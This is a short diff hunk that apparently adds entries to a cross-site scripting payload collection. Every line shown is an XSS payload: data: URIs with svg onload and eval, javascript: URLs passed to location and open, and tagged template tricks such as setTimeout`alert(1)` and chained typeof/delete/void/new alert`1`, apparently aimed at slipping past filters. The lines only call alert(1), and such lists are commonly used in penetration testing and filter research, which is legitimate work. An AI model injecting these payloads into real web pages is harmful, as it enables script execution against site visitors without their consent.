@@ -259,3 +259,6 @@ data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert
 location.reload`javascript:alert(1)` 
 location.href`javascript:alert(1)`
 location`javascript:alert(1)`
+open`javascript:alert(1)//#${'_self'}`
+setTimeout`alert(1);//${1000}`
+typeof delete typeof  delete void void new new alert`1`
